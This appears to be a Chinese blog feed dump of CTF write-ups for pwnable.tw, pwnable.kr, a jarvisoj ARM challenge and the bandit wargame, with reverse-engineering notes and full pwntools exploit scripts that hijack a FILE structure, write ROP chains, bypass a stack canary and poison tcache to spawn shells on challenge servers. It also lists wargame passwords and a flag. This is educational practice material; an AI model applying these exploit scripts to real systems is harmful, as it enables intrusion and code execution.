不过这个我看别人的wp又学到了一种姿势，就是用pwntools的 函数自动生成对应函数的shellcode shellcode = &#39;&#39; shellcode += shellcraft.pushstr(&#39;/home/orw/flag&#39;)#往栈上压入字符串 shellcode += shellcraft.open(&#39;esp&#39;, 0, 0)#设置参数 shellcode += shellcraft.read(&#39;eax&#39;, &#39;esp&#39;, 100) shellcode += shellcraft.write(1, &#39;esp&#39;, 100) seethefile防护机制： [*] &#39;/home/zs0zrc/pwn/pwnable.tw/seethefile/seethefile&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 程序一共五个功能 Open : 打开一个文件，但是不能打开flag文件 Read ： 读取文件的0x18字节的内容 Write to screen ： 将读取的内容打印出来 Close ： 关闭文件流 Exit ： 读取名字，同时关闭文件流并退出程序 程序的文件流指针存放在bss段 .bss:0804B280 public fp .bss:0804B280 ; FILE *fp .bss:0804B280 fp dd ? ; DATA XREF: openfile+6↑r .bss:0804B280 ; openfile+AD↑w ... .bss:0804B280 _bss ends .bss:0804B280 name变量在fp变量的上面，同时程序读取name时没限制长度，所以可以覆盖fp指针，通过伪造_IO_FILE_plus结构体，覆盖fp指针指向伪造的结构体，最后通过fclose函数关闭fp来getshell,即劫持fp指针 不过要先知道libc的地址，libc的地址可以通过读取 /proc/self/maps文件来来得到 泄露libc地址 def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) rc() sl(&#39;1&#39;) rc() sl(&#39;/proc/self/maps&#39;) rc() sl(&#39;2&#39;) rc() sl(&#39;2&#39;) rc() sl(&#39;3&#39;) leak = ru(&quot;r-xp&quot;) libc_base = int(&quot;0x&quot;+leak[-22:-14],16) print hex(libc_base) system = libc_base + libc.symbols[&#39;system&#39;] 伪造fake_file name_add = 0x804B260 fake_file = &quot;/bin/sh\x00&quot; fake_file = fake_file.ljust(0x20,&#39;\x00&#39;) fake_file += p32(name_add)#覆盖fp为name_add fake_file = fake_file.ljust(0x48,&#39;\x00&#39;) fake_file += p32(name_add + 0x10) # 指向一处值为0的地址 fake_file = fake_file.ljust(0x94, &quot;\x00&quot;) fake_file += p32(0x804b2f8-0x44)#fake vtable address = name_add + 0x98 - 0x44 fake_file += p32(system) 但是这题getshell还不够，要拿到flag还要运行服务器上的一个程序….有点骚，他将cat flag 命令删掉了，不过程序源码也给出了，很容易看到逻辑，按照它的判断条件输入，它就会将flag打印出来 exp: #!/usr/bin/env python from pwn import * local = 0 if local: p = process(&#39;./seethefile&#39;) elf = ELF(&#39;./seethefile&#39;) libc = elf.libc else: host = &#39;chall.pwnable.tw&#39; port = &#39;10200&#39; p = remote(host,port) elf = ELF(&#39;./seethefile&#39;) libc = ELF(&#39;./libc_32.so.6&#39;) context.arch = elf.arch context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;] context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) rc() sl(&#39;1&#39;) rc() sl(&#39;/proc/self/maps&#39;) rc() sl(&#39;2&#39;) rc() sl(&#39;2&#39;) rc() sl(&#39;3&#39;) leak = ru(&quot;r-xp&quot;) libc_base = int(&quot;0x&quot;+leak[-22:-14],16) print hex(libc_base) system = libc_base + libc.symbols[&#39;system&#39;] name_add = 0x804B260 fake_file = &quot;/bin/sh\x00&quot; fake_file = fake_file.ljust(0x20,&#39;\x00&#39;) fake_file += p32(name_add) fake_file = fake_file.ljust(0x48,&#39;\x00&#39;) fake_file += p32(name_add + 0x10) fake_file = fake_file.ljust(0x94, &quot;\x00&quot;) fake_file += p32(0x804b2f8-0x44) fake_file += p32(system) sl(&#39;5&#39;) rc() sl(fake_file) p.interactive() calc防护机制： ☁ calc checksec calc [*] &#39;/home/zs0zrc/pwn/pwnable.tw/calc/calc&#39; Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) 对它进行简单的逆向，发现它有很多库函数，说面这是静态编译的。用file查看下文件信息 ☁ calc file calc calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped 它的主函数很简单，很短，主要功能是进行 +、-、 *、 \、%的基本运算。 int __cdecl main(int argc, const char **argv, const char **envp) { ssignal(14, timeout); alarm(60); puts(&quot;=== Welcome to SECPROG calculator ===&quot;); fflush(stdout); calc(); return puts(&quot;Merry Christmas!&quot;); } 主要功能集中在calc函数 unsigned int calc() { pool pool; // [esp+18h] [ebp-5A0h] char s; // [esp+1ACh] [ebp-40Ch] unsigned int v3; // [esp+5ACh] [ebp-Ch] v3 = __readgsdword(0x14u); while ( 1 ) { bzero(&amp;s, 0x400u); // 初始化存储表达式的数组 if ( !get_expr(&amp;s, 1024) ) //读取计算表达式 break; init_pool(&amp;pool); //初始化pool，这个pool结构体我定义了一下 if ( parse_expr(&amp;s, &amp;pool) ) //解析表达式，并计算出结果 { printf(&quot;%d\n&quot;, pool.data[pool.idx - 1]); //将计算计过打印出来，计算结果存储在pool.data[pool.idx - 1]中 fflush(stdout); } } return __readgsdword(0x14u) ^ v3; } init_pool函数，对pool进行初始化 pool *__cdecl init_pool(pool *pool) { pool *result; // eax signed int i; // [esp+Ch] [ebp-4h] result = pool; pool-&gt;idx = 0; for ( i = 0; i &lt;= 99; ++i ) { result = pool; pool-&gt;data[i] = 0; } return result; } parse_expr函数 signed int __cdecl parse_expr(int buf, pool *pool) { int n; // ST2C_4 int v4; // eax int src; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int v7; // [esp+28h] [ebp-80h] char *dest; // [esp+30h] [ebp-78h] int v9; // [esp+34h] [ebp-74h] char s[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); src = buf; v7 = 0; bzero(s, 0x64u); for ( i = 0; ; ++i ) { if ( (*(i + buf) - &#39;0&#39;) &gt; 9 ) //当buf[i]为 运算符时，将前面的数字存到pool中 { n = i + buf - src; dest = malloc(n + 1); memcpy(dest, src, n); dest[n] = 0; if ( !strcmp(dest, &quot;0&quot;) ) //数字的第一位不可以为0 { puts(&quot;prevent division by zero&quot;); fflush(stdout); return 0; } v9 = atoi(dest); if ( v9 &gt; 0 ) { v4 = pool-&gt;idx++; pool-&gt;data[v4] = v9; //将数字存储到pool } if ( *(i + buf) &amp;&amp; (*(i + 1 + buf) - &#39;0&#39;) &gt; 9 )//两个运算符不能相邻 { puts(&quot;expression error!&quot;); fflush(stdout); return 0; } src = i + 1 + buf; if ( s[v7] ) //s数组是用来存储运算符的 { switch ( *(i + buf) ) { case &#39;%&#39;: case &#39;*&#39;: case &#39;/&#39;: if ( s[v7] != &#39;+&#39; &amp;&amp; s[v7] != &#39;-&#39; ) { eval(pool, s[v7]); s[v7] = *(i + buf); } else { s[++v7] = *(i + buf); } break; case &#39;+&#39;: case &#39;-&#39;: eval(pool, s[v7]); s[v7] = *(i + buf); break; default: eval(pool, s[v7--]); break; } } else { s[v7] = *(i + buf); } if ( !*(i + buf) ) break; } } while ( v7 &gt;= 0 ) eval(pool, s[v7--]); return 1; } 漏洞在eval函数中，这里存在一个逻辑漏洞，可以通过构造形如 +300+1的payload 修改 pool.idx, 进而实现任意地址写 pool *__cdecl eval(pool *pool, char a2) { pool *result; // eax if ( a2 == &#39;+&#39; ) { pool-&gt;data[pool-&gt;idx - 2] += pool-&gt;data[pool-&gt;idx - 1]; } else if ( a2 &gt; &#39;+&#39; ) { if ( a2 == &#39;-&#39; ) { pool-&gt;data[pool-&gt;idx - 2] -= pool-&gt;data[pool-&gt;idx - 1]; } else if ( a2 == &#39;/&#39; ) { pool-&gt;data[pool-&gt;idx - 2] /= pool-&gt;data[pool-&gt;idx - 1]; } } else if ( a2 == &#39;*&#39; ) { pool-&gt;data[pool-&gt;idx - 2] *= pool-&gt;data[pool-&gt;idx - 1]; } result = pool; --pool-&gt;idx; return result; } 漏洞找到后就很好做了，虽然它开了canary，但是并没有用，因为有任意地址写。这个程序是静态编译的，所以可以利用ROPgadget 生成ropchain，最后利用这个漏洞将ropchain写入栈中去执行。 ROPgadget –binary calc –ropchain 先计算返回地址到pool的偏移 对应的数组下标 从ida中观察calc函数的栈，可以发现pool在栈中的偏移为0x5a0， 返回地址和pool的距离为0x5a0+4 所以对应的数组下标为0x5a4/4 = 361 调试一下，在calc函数处下个断点 当程序断在calc函数时，对应的esp和ebp以及返回地址的在栈中的地址如下 $esp = 0xffffc990 $ebp = 0xffffcf48 $ret_add = 0xffffcf4c ==&gt; 0x8049499 (main+71) ◂— mov dword ptr [esp], 0x80bf842 pool = 0xffffc9a8 泄露361偏移处的内容 可以发现把返回地址的内容泄露出来了，最后将rop链写入栈中就ok了 exp： #!/usr/bin/env python from pwn import * local = 0 if local: sh = process(&#39;./calc&#39;) elf = ELF(&#39;./calc&#39;) libc = elf.libc else: sh = remote(&quot;chall.pwnable.tw&quot;,10100) elf = ELF(&#39;./calc&#39;) context.arch = elf.arch context.log_level=&#39;debug&#39; def sd(content): sh.send(content) def sl(content): sh.sendline(content) def rc(): return sh.recv() def ru(content): return sh.recvuntil(content) def calc(x,y): sl(&quot;+&quot; + str(x)) data = sh.recvline() data = int(data,10) if data &gt; y : temp = data - y payload = &quot;+&quot; + str(x) + &quot;-&quot; + str(temp) sl(payload) rc() else: temp = y - data payload = &quot;+&quot; + str(x) + &quot;+&quot; + str(temp) sl(payload) rc() p = [] p.append(0x080701aa) # pop edx ; ret p.append(0x080ec060) # @ .data p.append(0x0805c34b) # pop eax ; ret p.append(u32(&#39;/bin&#39;)) p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret p.append(0x080701aa) # pop edx ; ret p.append(0x080ec064) # @ .data + 4 p.append(0x0805c34b) # pop eax ; ret p.append(u32(&#39;//sh&#39;)) p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret p.append(0x080701aa) # pop edx ; ret p.append(0x080ec068) # @ .data + 8 p.append(0x080550d0) # xor eax, eax ; ret p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret p.append(0x080481d1) # pop ebx ; ret p.append(0x080ec060) # @ .data p.append(0x080701d1) # pop ecx ; pop ebx ; ret p.append(0x080ec068) # @ .data + 8 p.append(0x080ec060) # padding without overwrite ebx p.append(0x080701aa) # pop edx ; ret p.append(0x080ec068) # @ .data + 8 p.append(0x080550d0) # xor eax, eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x0807cb7f) # inc eax ; ret p.append(0x08049a21) # int 0x80 rc() for i in range(len(p)): calc(361+i,p[i]) sh.sendline(&quot;&quot;) sh.interactive() dubble sort防护机制： ☁ doublesort checksec dubblesort [*] &#39;/home/zs0zrc/pwn/pwnable.tw/doublesort/dubblesort&#39; Arch: i386-32-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 简单的运行了一下，程序先要你输入一个用户名，然后输入想要排序的数字个数和要排序的数字，最后将输入的数字排好序打印出来。 ☁ doublesort ./dubblesort What your name :das Hello das ���/,How many numbers do you what to sort :3 Enter the 0 number : 2 Enter the 1 number : 1 Enter the 2 number : 4 Processing...... Result : 1 2 4 % 程序的逻辑不复杂，简单的逆一下。程序实现了一个简单的冒泡排序。 main函数 int __cdecl main(int argc, const char **argv, const char **envp) { int len; // eax int *temp; // edi unsigned int i; // esi unsigned int j; // esi int v7; // ST08_4 int result; // eax unsigned int n; // [esp+18h] [ebp-74h] int array; // [esp+1Ch] [ebp-70h] char buf; // [esp+3Ch] [ebp-50h] unsigned int v12; // [esp+7Ch] [ebp-10h] v12 = __readgsdword(0x14u); sub_8B5(); __printf_chk(1, &quot;What your name :&quot;); read(0, &amp;buf, 0x40u); // 没有0截断，可以用来泄露栈上的信息 __printf_chk(1, &quot;Hello %s,How many numbers do you what to sort :&quot;); __isoc99_scanf(&quot;%u&quot;, &amp;n); len = n; // 没有限制输入的个数，可以造成栈溢出 if ( n ) { temp = &amp;array; i = 0; do { __printf_chk(1, &quot;Enter the %d number : &quot;); fflush(stdout); __isoc99_scanf(&quot;%u&quot;, temp); ++i; len = n; ++temp; } while ( n &gt; i ); } sort((unsigned int *)&amp;array, len); puts(&quot;Result :&quot;); if ( n ) { j = 0; do { v7 = *(&amp;array + j); __printf_chk(1, &quot;%u &quot;); ++j; } while ( n &gt; j ); } result = 0; if ( __readgsdword(0x14u) != v12 ) sub_BA0(); return result; } 可以很容易的发现其中的两个漏洞。一个是在读取name时没有进行0截断，导致可以泄露出栈上的一些信息。另一个就是它对输入数字的个数没有限制，导致了栈溢出。sort函数对输入的数字进行冒泡排序。 首先是信息泄露，通过观察栈中的情况，发现可以泄露出libc的地址 pwndbg&gt; telescope 0xffffcedc 00:0000│ 0xffffcedc ◂— 0x61616161 (&#39;aaaa&#39;) 01:0004│ 0xffffcee0 —▸ 0xffffd10a ◂— 0x110000 02:0008│ 0xffffcee4 ◂— 0x2f /* &#39;/&#39; */ 03:000c│ 0xffffcee8 ◂— 0x5e /* &#39;^&#39; */ 04:0010│ 0xffffceec ◂— 0x16 05:0014│ 0xffffcef0 ◂— 0x8000 06:0018│ 0xffffcef4 —▸ 0xf7fb5000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0 07:001c│ 0xffffcef8 —▸ 0xf7fb3244 —▸ 0xf7e1b020 (_IO_check_libio) ◂— call 0xf7f22b59 libc地址泄露出来后可以计算出system函数地址以及binsh字符串地址，加上有个栈溢出，所以这题应该是用rop来做了。但是它保护机制全开，要想办法绕过canary。这里涉及到一个知识点，就是scanf读取“+” “-” 这两个符号时，不会改变栈里的内容，而且也不会影响之后的输入。所以只要在往canary写入时，输入”+”就不会改变canary。就可以开心的进行rop了。 计算canary 相对于数组的下标 array_add = 0xffa6ae7c canary_add = 0xffa6aedc offset = canary_add - array_add = 0x60 index = offset/4 = 24 所以canary相对于数组的下标为24，也就是第25个数字 计算返回地址相对于数组的下标 array_add = 0xff8ee36c ret_add = 0xff8ee3ec offset = 0x80 index = offset/4 = 32 所以返回地址相对于数组的下标为32，也就是第33个数字 还有一点要注意的是sort函数对数组排序的影响，canary前面的数字都要比canary小，canary后面的数字都要比canary大，不然的话sort函数就会是canary的位置发生变换，就会触发_stack_chk_fail函数。 exp: #!/usr/bin/env python from pwn import * local = 1 if local: p = process(&#39;./dubblesort&#39;) elf = ELF(&#39;./dubblesort&#39;) libc = elf.libc else: p = remote(&quot;chall.pwnable.tw&quot;,10101) elf = ELF(&#39;./dubblesort&#39;) libc = ELF(&#39;./libc_32.so.6&#39;) context.arch = elf.arch context.log_level=&#39;debug&#39; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) def debug(addr,PIE=False): if PIE: text_base = int(os.popen(&quot;pmap {}| awk &#39;{{print $1}}&#39;&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(p,&#39;b *{}&#39;.format(hex(text_base+addr))) else: gdb.attach(p,&quot;b *{}&quot;.format(hex(addr))) debug(0x931,True) #sort start #debug(0x9BB,True) #sort end #debug(0x9c3,True) #main rc() sd(&#39;a&#39;*0x18 + &#39;\x01&#39;) ru(&#39;a&#39;*0x18) leak = u32(p.recv()[:4]) #libc_base = leak - 0x1b0001 #remote libc_base = leak - 0x1b2001 #local libc.address = libc_base system = libc.symbols[&#39;system&#39;] binsh = libc.search(&quot;/bin/sh&quot;).next() log.info(&quot;libc_base ==&gt; {}&quot;.format(hex(libc_base))) sl(&quot;35&quot;) for i in range(24): rc() sl(str(0xdeadbeef)) rc() sl(&quot;+&quot;) for i in range(7): rc() sl(str(system)) pause() rc() sl(str(system)) rc() sl(str(0xdeadbeef)) rc() sl(str(binsh)) p.interactive() tcahce_tear过程不小心删掉了….就不再写了，看exp。 exp: from pwn import* context.log_level=&quot;debug&quot; #p = process(&#39;./tcache_tear&#39;) p = remote(&quot;chall.pwnable.tw&quot;,&quot;10207&quot;) elf = ELF(&#39;./tcache_tear&#39;) libc = elf.libc def new(size,content): p.sendlineafter(&quot;Your choice :&quot;,&quot;1&quot;) p.sendlineafter(&quot;Size:&quot;,str(size)) p.sendafter(&quot;Data:&quot;,content) def free(): p.sendlineafter(&quot;Your choice :&quot;,&quot;2&quot;) def show(): p.sendlineafter(&quot;Your choice :&quot;,&quot;3&quot;) p.sendafter(&quot;Name:&quot;,&#39;a&#39;*0x20) new(0x80,&#39;aaaa\n&#39;) free() free() new(0x80,p64(0x602020)*2 + &quot;\n&quot;) new(0x80,&quot;\n&quot;) log.info(&quot;******leak info********&quot;) fake_stdout = p64(0xfbad1800) + p64(0)*3 + &quot;\x00&quot; new(0x80,&quot;\x60&quot;) new(0x80,fake_stdout) leak = p.recv(0x60) leak = leak[0x20:] leak_add = u64(leak[:6].ljust(8,&#39;\x00&#39;)) libc_base = leak_add - 0x3eb780 libc.address = libc_base success(hex(libc_base)) one_gadget = libc_base + 0x4f322 free_hook = libc.symbols[&#39;__free_hook&#39;] new(0x20,&#39;aaaa\n&#39;) free() free() new(0x20,p64(free_hook)*2 + &quot;\n&quot;) new(0x20,&quot;\n&quot;) new(0x20,p64(one_gadget)) free() p.interactive(&quot;zs0zrc&gt;&gt;&quot;) #FLAG{tc4ch3_1s_34sy_f0r_y0u}]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探arm下的pwn]]></title>
    <url>%2F2018%2F10%2F07%2F2018-10-7-%E5%88%9D%E6%8E%A2arm%E4%B8%8B%E7%9A%84pwn%2F</url>
    <content type="text"><![CDATA[最近做了下InCTF，第一道pwn题就是arm架构的，之前没有接触过，就学习一下 基础知识可以看下维基百科的arm架构 ，介绍的挺详细的 arm下的通用寄存器 函数调用约定： ARM：参数1~参数4 分别保存到 R0~R3 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 R0 中。 ARM64：参数1~参数8 分别保存到 X0~X7 寄存器中 ，剩下的参数从右往左依次入栈，被调用者实现栈平衡，返回值存放在 X0 中。 arm下的pc相当于eip或者rip，保存着下一条要执行的指令的地址 环境准备这里我没装新的虚拟机，我直接在ubuntu16.04装的环境 安装gdb-multiarch，用来调试多架构的程序 sudo apt-get install gdb-multiarch 安装qemu sudo apt-get install qemu-user 安装程序架构对应的共享库 简单运行下程序，看需要什么共享库 $ ./wARMup [19:42:58] /lib/ld-linux-armhf.so.3: No such file or directory 然后再终端输入 zs0zrc@ubuntu: ~/game/InCTF/PWN/WARMUP $ apt-cache search &quot;libc6&quot; | grep arm [10:34:21] libc6-arm64-cross - GNU C Library: Shared libraries (for cross-compiling) libc6-armhf-cross - GNU C Library: Shared libraries (for cross-compiling) libc6-dev-arm64-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling) libc6-dev-armhf-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling) libc6-armel-armhf-cross - Dummy package to get libc6:armel installed libc6-armel-cross - GNU C Library: Shared libraries (for cross-compiling) libc6-armhf-armel-cross - Dummy package to get libc6:armhf installed libc6-dbg-arm64-cross - GNU C Library: detached debugging symbols (for cross-compiling) libc6-dbg-armel-cross - GNU C Library: detached debugging symbols (for cross-compiling) libc6-dbg-armhf-cross - GNU C Library: detached debugging symbols (for cross-compiling) libc6-dev-armel-armhf-cross - Dummy package to get libc6-dev:armel installed libc6-dev-armel-cross - GNU C Library: Development Libraries and Header Files (for cross-compiling) libc6-dev-armhf-armel-cross - Dummy package to get libc6-dev:armhf installed 安装对应的共享库 通过 sudo apt-get install libc6-armhf-cross 来安装 运行 程序运行需要用qemu来指定它共享库的位置 参数 -L指定共享库的位置 qemu-arm -L /usr/arm-linux-gnueabihf/ ./wARMup 调试的话用gdb-multiarch 先用qemu将程序映射到某个端口，参数为-g 然后用gdb-multiarch开启远程调试 先用qemu映射到端口1234 qemu-arm -g 1234 -L /usr/arm-linux-gnueabihf/ ./wARMup 然后用gdb-multiarch开启远程调试 pwndbg&gt; set architecture arm The target architecture is assumed to be arm pwndbg&gt; target remote localhost:1234 题目typo这是jarvisoj平台上的一道pwn题 防护机制: [*] &#39;/home/zs0zrc/pwn/jarvisoj/typo/typo&#39; Arch: arm-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8000) 文件信息： ☁ typo file typo typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped 说明这个程序是静态链接，所以程序中一定会有system函数以及”/bin/sh”字符串，但是用ida反编译时会发现函数的符号都被去除了，但是可以在字符串表找到”/bin/sh”字符串，这里用rizzo插件恢复下符号。 做法： 将arm的libc.so文件拖入ida 然后在选择 file--&gt;Produce file--&gt;Rizzo signature file 导出符号文件 然后用ida打开typo 选择 file--&gt;Load file--&gt;Rizzo signature file 就可以看到一些函数符号了 char *__fastcall system(int a1) { char *result; // r0 if ( a1 ) result = sub_10BA8(a1); else result = (sub_10BA8(&quot;exit 0&quot;) == 0); return result; } 简单运行下程序，程序要我们输入一个字符串，因为arm下的pwn一般是栈溢出居多，而且防护机制没开canary，所以用pwndbg测了下栈的大小 pwndbg&gt; cyclic -l 0x62616164 112 栈的长度为112，接下来就是找能控制r0和pc的gadget，这里我用的是ropper (typo/ELF/ARM)&gt; search pop|ret |grep r0 [INFO] Searching for gadgets: pop|ret |grep r0 [INFO] File: typo 0x00011364: pop {lr}; add sp, sp, #0x10; bx lr; 0x00011398: pop {lr}; add sp, sp, #0xc; bx lr; 0x0001db98: pop {lr}; b #0x11e38; mov r1, lr; pop {lr}; bx r3; 0x0001dba4: pop {lr}; bx r3; 0x00053ea8: pop {pc}; mov r0, #0; bx lr; 0x00050f30: pop {pc}; mov r0, r3; bx lr; 0x00053078: pop {r0, r1, r2, r3, r4, lr}; bx ip; 0x00053d64: pop {r0, r1, r3, ip, lr}; pop {r2}; ldr r1, [r0, #4]; bx r1; 0x00020904: pop {r0, r4, pc}; //选择的gadget 之后就是ROP就行了 exp: #!/usr/bin/env python from pwn import * local = 1 debug = 0 if local: p = remote(&quot;pwn2.jarvisoj.com&quot;,&quot;9888&quot;) elif debug: p = process([&quot;qemu-arm&quot;, &quot;-g&quot;, &quot;1234&quot;, &quot;-L&quot;, &quot;arm-linux-gnueabihf&quot;, &quot;typo&quot;]) else: p = process([&quot;qemu-arm&quot;, &quot;-L&quot;, &quot;/usr/arm-linux-gnueabihf&quot;, &quot;typo&quot;]) elf = ELF(&quot;typo&quot;) libc = ELF(&quot;/usr/arm-linux-gnueabihf/lib/libc.so.6&quot;) context.binary = &quot;typo&quot; context.log_level = &quot;debug&quot; def sd(content): p.send(content) def sl(content): p.sendline(content) def rc(): return p.recv() def ru(content): return p.recvuntil(content) rc() sl(&#39;&#39;) payload = &#39;a&#39;*112 + p32(0x00020904) + p32(0x0006c384) + p32(0) + p32(0x000110B4) rc() sl(payload) p.interactive() reference: 调用约定 M4x大佬博客 D4rk3r大佬博客]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ARM</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr writeup]]></title>
    <url>%2F2018%2F10%2F06%2F2018-10-6-pwnable.kr-writeup%2F</url>
    <content type="text"><![CDATA[感觉pwnable.tw有点点难，还是先做pwnable.kr好了，writeup都会写在这篇文章里 bof这题给了二进制文件和源码 源码： #include &lt;stdio.h&gt; #include &lt;string.h&gt; #include &lt;stdlib.h&gt; void func(int key){ char overflowme[32]; printf(&quot;overflow me : &quot;); gets(overflowme); // smash me! if(key == 0xcafebabe){ system(&quot;/bin/sh&quot;); } else{ printf(&quot;Nah..\n&quot;); } } int main(int argc, char* argv[]){ func(0xdeadbeef); return 0; } 一个简单的栈溢出，只要覆盖变量key为0xcafebabe 就会执行system函数 exp: from pwn import * p = remote(&#39;pwnable.kr&#39;,9000) offset = 0x2c+8 payload = &#39;a&#39;*offset +&quot;\xbe\xba\xfe\xca&quot; p.sendline(payload) p.interactive() flag这道题给了一个ELF文件，题目提示说这是一个打包过的礼物，可以猜测它加过壳。 用strings 打印下文件的可见字符串 $ strings flag UPX! @/x8 gX lw_ H/\_@ Kl$ H9\$(t ..... PROT_EXEC|PROT_WRITE failed. $Info: This file is packed with the UPX executable packer http://upx.sf.net $ $Id: UPX 3.08 Copyright (C) 1996-2011 the UPX Team. All Rights Reserved. $ 可以看到程序加了upx壳，并且upx版本是3.08。先脱个壳 ，linux下用 upx -d 命令，然后拖到ida中反编译下 int __cdecl main(int argc, const char **argv, const char **envp) { char *dest; // ST08_8 puts(&quot;I will malloc() and strcpy the flag there. take it.&quot;, argv, envp); dest = (char *)malloc(100LL); strcpy(dest, flag); return 0; } 可以看到程序逻辑很简单，它将flag复制到dest变量，所以可以在data段中找到flag]]></content>
      <categories>
        <category>CTF&#39;s writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>pwnable.kr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Wargames--bandit 通关教程]]></title>
    <url>%2F2018%2F10%2F05%2F2018-10-5-Wargames--bandit-%E9%80%9A%E5%85%B3%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[这是一个让人熟悉linux操作的一个wargame，挺有意思的 网站 bandit0直接ssh连上去，cat readme 拿到下一关的密码 密码：boJ9jbbUNNfktd78OOpsqOltutMc3MY1 bandit1这一关它将密码藏在 - 文件中，以’-‘作为文件名，代表标准输入流或者标准输出流，要显示 ‘-‘文件的内容 需要用 cat ./- 来打印出来 密码：CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 bandit2这关它将密码存在 spaces in this filename这个文件中，但是直接cat 的话不行，要在文件名左右加上”， 通过 cat “spaces in this filename”打印密码 密码：UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK bandit3进到inhere的目录下，ls发现没有东西。通过 ls -al 将隐藏的文件也显示出来，发现有个.hidden文件。在linux下文件名以.开头的都默认会隐藏起来。 通过 cat .hidden打印密码 密码：pIwrPrtPN36QITSp3EQaw936yaFoFgAB bandit4发现inhere中有好多个文件，文件名都以’-‘开头，所以不能直接 用cat命令+文件名，文件名前加./ 用file 命令查看目录下文件的类型，发现有个ASCII text和别的都不一样，密码就在这个文件里面 bandit4@bandit:~$ ls inhere bandit4@bandit:~$ cd inhere/ bandit4@bandit:~/inhere$ ls -file00 -file02 -file04 -file06 -file08 -file01 -file03 -file05 -file07 -file09 bandit4@bandit:~/inhere$ file ./* ./-file00: PGP\011Secret Key - ./-file01: data ./-file02: data ./-file03: data ./-file04: data ./-file05: data ./-file06: data ./-file07: ASCII text ./-file08: data ./-file09: data 密码：koReBOKuIDDepwhWk7jZC0RTdopnAYKh bandit5题目给的提示： The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: human-readable 1033 bytes in size not executable 进入inhere文件夹，可以发现有很多目录，结合题目给的提示，用find命令查找文件 find -type f -size 1033c -type设置查找文件的属性 f是普通文件 -size指定查找的大小 bandit5@bandit:~/inhere$ find -type f -size 1033c ./maybehere07/.file2 密码：DXjZPULLxYr17uwoI01bNLQbtFemEgo7 bandit6题目提示 The password for the next level is stored somewhere on the server and has all of the following properties: owned by user bandit7 owned by group bandit6 33 bytes in size 文件在服务器的某个位置，文件的用户是 bandit7 群组是 bandit6,大小为33c 用命令 find / -user bandit7 -group bandit6 -size 33c 会出来一堆东西，但是又权限的只有 /var/lib/dpkg/info/bandit7.password 用cat将它内容打印出来 密码：HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs bandit7这关密码存在 data.txt中，并且密码在millionth这个单词后面，用grep命令 grep millionth data.txt millionth cvX2JJa4CFALtqS87jk27qwqGhBM9plV 密码：cvX2JJa4CFALtqS87jk27qwqGhBM9plV bandit8密码存储在data.txt中，并且只出现一次 用sort命令给data.txt的内容排序，同时用uniq命令忽略文件的重复行 sort data.txt | uniq -u -u 参数是只显示出现一次的行列 bandit8@bandit:~$ sort data.txt | uniq -u UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR bandit8@bandit:~$ 密码：UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR bandit9密码存储在data.txt中，并且以几个 “===”开头 用strings 命令打印data.txt的可见字符，用grep命令筛选出包含 “===”的字符串 bandit9@bandit:~$ strings data.txt | grep &quot;==&quot; &lt;========== the? ========== password *========== is :========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk 密码 ： truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk bandit10密码存储在data.txt中，并且被base64加密过，这里用到的命令是base64 base64用法： 格式：base64 file 从指定的文件file中读取数据，编码为base64字符串输出。 格式：base64 -d file 从标准输入中读取已经进行base64编码的内容，解码输出。 bandit10@bandit:~$ base64 -d data.txt The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR 密码：IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR bandit11题目提示所有大小写字母位置都旋转了13个位置，这里用到了tr命令 tr 参数 前面的是原字符集，后面的是要替换的字符集 